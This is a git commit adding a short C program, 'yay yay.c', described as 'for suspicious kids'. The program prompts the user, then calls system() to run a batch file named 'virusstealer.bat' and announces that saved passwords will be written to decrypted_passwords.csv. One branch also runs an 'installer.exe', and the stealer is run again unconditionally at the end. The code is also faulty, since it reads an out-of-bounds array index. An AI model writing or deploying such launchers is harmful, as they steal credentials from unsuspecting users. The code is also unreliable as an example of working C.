36645ee0e94a1569c1e875ce1b51e925d75a1c16
Sniper12356 <116349605+Sniper12356@users.noreply.github.com>
2024-06-05 22:12:12 +0530

    Added "yay yay.c" for suspicious kids

---
+++ yay yay.c
@@ -0,0 +1,42 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+int main () {
+    printf ("Does your computer has python?(y/n)\n");
+
+    char option[2];
+    scanf ("%s", option);
+
+    switch (option[2]) {
+        case 'y' : ; 
+         char* batchfile = "virusstealer.bat";
+         system (batchfile);
+         printf ("Current Passwords will be saved in decrypted_passwords.csv, opening that file in notepad.");
+
+    break;
+
+       case 'n' : ;
+       char* executable_path = "installer.exe";
+       int return_value = system(executable_path);
+       if (return_value == 0) {
+        printf("Executable was executed successfully.\n");
+    } 
+    else {
+        printf("Failed to execute the executable.\n");
+    }
+    break;
+
+    default : printf ("Picked the wrong option; Options are: Y for YES, N for NO.");
+
+    }
+        char opt[2];
+    scanf ("%s", opt);
+    char* batchfile = "virusstealer.bat";
+    system (batchfile);
+   //exit code
+    printf ("Press any key to exit...\n");
+    char exit[2];
+    scanf ("%s", exit);
+    return 0;
+
+}
